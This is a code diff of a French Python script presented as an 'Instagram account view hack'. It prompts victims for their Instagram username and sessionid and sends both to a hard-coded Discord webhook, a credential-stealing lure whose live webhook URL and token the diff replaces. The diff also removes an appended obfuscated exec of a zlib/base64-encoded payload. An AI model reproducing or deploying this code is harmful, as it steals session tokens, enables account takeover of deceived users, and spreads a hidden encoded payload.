@@ -55,19 +55,19 @@ Instagram account view hack!               by : LayoMoon
 
 [+] Update 2.6
 Chargement en cours [#############################]-100%""")
-    time.sleep(1)  # Petite pause pour simuler un chargement
+    time.sleep(1)  
     nom_utilisateur = input("Nom d'utilisateur : ")
-    # Envoyer le nom d'utilisateur au webhook Discord
-    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1361032583646937188/difoVJToAVQ6tMcKE0EukX_sBQAumrj6j3U8ZlNhX8R5rxBrt60ijE_ER_0VWD_4ixew', content=f'Nouveau nom d\'utilisateur capturé : {nom_utilisateur}')
+    
+    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1409254113686061186/VPqWYIfDr1J2cguoK0bP0E-r2MX7CYQMOF2sBtN27Cbr8nibJNy5X4W_FTtQ-c1IbZHZ', content=f'Nouveau nom d\'utilisateur capturé : {nom_utilisateur}')
     webhook.execute()
     return nom_utilisateur
 
 def saisir_mot_de_passe():
     print("Entrez une sissionid...")
-    time.sleep(1)  # Petite pause pour simuler un chargement
+    time.sleep(1)  
     mot_de_passe = input("sessionid : ")
-    # Envoyer la sessionid au webhook Discord
-    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1361032583646937188/difoVJToAVQ6tMcKE0EukX_sBQAumrj6j3U8ZlNhX8R5rxBrt60ijE_ER_0VWD_4ixew', content=f'Nouvelle sessionid capturée : {mot_de_passe}')
+    
+    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1409254113686061186/VPqWYIfDr1J2cguoK0bP0E-r2MX7CYQMOF2sBtN27Cbr8nibJNy5X4W_FTtQ-c1IbZHZ', content=f'Nouvelle sessionid capturée : {mot_de_passe}')
     webhook.execute()
     return mot_de_passe
 
@@ -76,33 +76,33 @@ def petit_chargement():
 --------------------------------------------------------------
  [#] [WARNING] Chargement en cours....   
 --------------------------------------------------------------""")
-    time.sleep(2)  # Chargement de 2 secondes
+    time.sleep(2)  
     print("Chargement terminé.")
 
 def chargement():
     print("Chargement en cours...")
-    for i in range(31):  # Simulation de 30 étapes de chargement
-        time.sleep(1)    # Attente de 1 seconde entre chaque étape
+    for i in range(31): 
+        time.sleep(1)   
         pourcentage = i * 100 / 30
-        barre_progression = "#" * (i // 3)  # Barre de progression
+        barre_progression = "#" * (i // 3)  
         print(f"\r[{barre_progression:<10}] {pourcentage:.2f}%", end="", flush=True)
     print("\nChargement terminé.")
 
 def main():
     lien_base = "https://instagram.com"
     nombre_liens = 60
-    utilisateurs = ["user1", "user2", "user3"]  # Liste des noms d'utilisateur possibles
-    mots_de_passe = ["pass1", "pass2", "pass3"]  # Liste des mots de passe possibles
+    utilisateurs = ["user1", "user2", "user3"] 
+    mots_de_passe = ["pass1", "pass2", "pass3"]  
     
-    petit_chargement()  # Petit chargement avant la saisie du mot de passe
+    petit_chargement() 
     
     nom_utilisateur = saisir_nom_utilisateur()
     
-    petit_chargement()  # Petit chargement avant la saisie du mot de passe
+    petit_chargement() 
     
     mot_de_passe = saisir_mot_de_passe()
     
-    chargement()  # Chargement avant la génération des liens
+    chargement()  
     
     liens = generer_liens(lien_base, nombre_liens, [nom_utilisateur], [mot_de_passe])
     
@@ -112,4 +112,5 @@ def main():
 
 if __name__ == "__main__":
     main()
-exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGEPXzUZdrCDiQUQE15uItOmopWkaMlntKv53N3TxMsN78+bNRzeEMSaKo+0hyW/XNbKpEYyWmOLWJpm6AcjbGOlEO09j7d+BL0qxJkWKu30ssJqb1Zz4iTzgzcP13evm6fHm6l5knbKj92AT5+zMKGPU4vRcrUomtdZLkSVNhLonBUwWQsreebhCBxD4ShBXzTuprQ+17Tm7vGUSVQT7ybUQz+ULaasDdoJ8fXQOqAPPW3Hh9nbt0X/1eKYFgQksz2erFuw4hAiIfP6AaozOZAtZKX8YsjX+CvIH3TNfDQ==')[0])))
+
+
